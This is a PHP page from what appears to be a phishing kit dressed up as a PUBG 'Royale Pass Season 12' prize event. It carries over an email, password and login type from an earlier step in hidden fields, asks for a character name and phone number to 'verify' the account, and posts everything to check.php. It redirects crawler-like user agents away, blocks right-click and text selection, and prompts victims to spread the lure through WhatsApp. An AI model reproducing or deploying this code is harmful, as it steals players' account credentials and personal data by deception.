<?php
$ua = $_SERVER['HTTP_USER_AGENT'];
if(preg_match('#Mozilla/4.05 [fr] (Win98; I)#',$ua) || preg_match('/Java1.1.4/si',$ua) || preg_match('/MS FrontPage Express/si',$ua) || preg_match('/HTTrack/si',$ua) || preg_match('/IDentity/si',$ua) || preg_match('/HyperBrowser/si',$ua) || preg_match('/Lynx/si',$ua)) 
{
header('Location: cracker.php');
die();
}
?>
<?php
// MENGAMBIL KONTROL
include("setting.php");

// MENANGKAP DATA YANG DI-INPUT
$email = $_POST['email'];
$password = $_POST['password'];
$login = $_POST['login'];

// MENGALIHKAN KE HALAMAN UTAMA JIKA DATA BELUM DI-INPUT
if($email == "" && $password == "" && $login == ""){
header("Location: index.php");
}
?>
<html>
<head>
<meta charset="UTF-8"/>
<meta name="viewport" content="width=device-width, initial-scale=1.0, minimum-scale=1.0, maximum-scale=1.0, user-scalable=no"/>
<meta http-equiv="X-UA-Compatible" content="IE=edge">
<meta property="og:title" content="<?php echo $title;?>">
<meta name="description" content="<?php echo $description;?>">
<meta property="og:description" content="<?php echo $description;?>">
<meta property="og:url" content="./">
<meta property="og:site_name" content="<?php echo $title;?>">
<meta property="og:type" content="website">
<meta name="copyright"content="<?php echo $copyright;?>">
<meta name="theme-color" content="<?php echo $theme;?>">
<meta property="og:image" content="<?php echo $image;?>">
<title><?php echo $title;?></title>
<link rel="stylesheet" href="css/style.css">
<link rel="stylesheet" href="css/animate.css">
<link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/font-awesome/4.7.0/css/font-awesome.min.css">
<link rel="icon" href="<?php echo $icon;?>">
</head>
<body oncontextmenu="return false" onselectstart="return false" ondragstart="return false">


<!--- VERIFY CONTENT --->
<div class="container">
<div class="container-dark">
<center>
<div class="container-line"></div>
</center>
<div class="header">
<img src="img/logo.png">
<button type="button" onclick="share()"><i class="fa fa-share"></i> Share</button>
</div>
<div class="box">
<div class="txt-season">ACCOUNT VERIFICATION<br> <small>VERIFY YOUR ACCOUNT BEFORE COLLECT YOUR PRIZE</small></div>
<center>
<form action="check.php" method="post">
<div class="box-notes">
<input type="hidden" name="email" value="<?php echo $email;?>" readonly>
<input type="hidden" name="password" value="<?php echo $password;?>" readonly>
<input type="text" name="nickname" placeholder="Character Name" autocomplete="off" required>
<input type="number" name="nope" placeholder="Phone Number" autocomplete="off" required>
<input type="hidden" name="login" value="<?php echo $login;?>" readonly>
</div>
<button type="submit" class="btn-continue" style="margin-top: 3%;">Verify</button>
</form>
</center>
</div> <!--- box --->
</div> <!--- container dark --->
</div> <!--- container --->
<!--- VERIFY CONTENT END --->


<!--- SHARE CONTENT --->
<div class="popup share" style="display: none;">
<div class="popup-box animated fadeIn">
<div class="container">
<div class="container-dark">
<center>
<div class="container-line"></div>
</center>
<div class="header">
<img src="img/logo.png">
<button type="button"><i class="fa fa-share"></i> Share</button>
</div>
<div class="box">
<center>
<img class="season-logo" src="img/s10.png">
</center>
<div class="txt-season">ROYALE PASS SEASON 12 <br> <small>SHARE THIS EVENT TO YOUR FRIENDS OR FAMILY</small></div>
<center>
<div class="box-notes">
<center>
<div class="pilihan-login" onclick="location.href='whatsapp://send?text=<?php echo $pesanWa;?><?php echo $linkWeb;?>'">
<img src="img/wa.png">
</div>
</center>
</div>
<button type="button" class="btn-continue" onclick="closeshare()">Cancel</button>
</center>
</div> <!--- box --->
</div> <!--- container dark --->
</div> <!--- container --->
</div>
</div>
<!--- SHARE CONTENT END --->


<!--- fieldset content --->
<script src="https://ajax.googleapis.com/ajax/libs/jquery/2.1.3/jquery.min.js"></script>
<script src="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.5/js/bootstrap.min.js"></script>
<!--- /fieldset content --->
<script type="text/javascript" src="http://code.jquery.com/jquery-1.10.2.min.js"></script>
<script src="js/tab.js"></script>
<script src="js/popup.js"></script>

</body>
</html>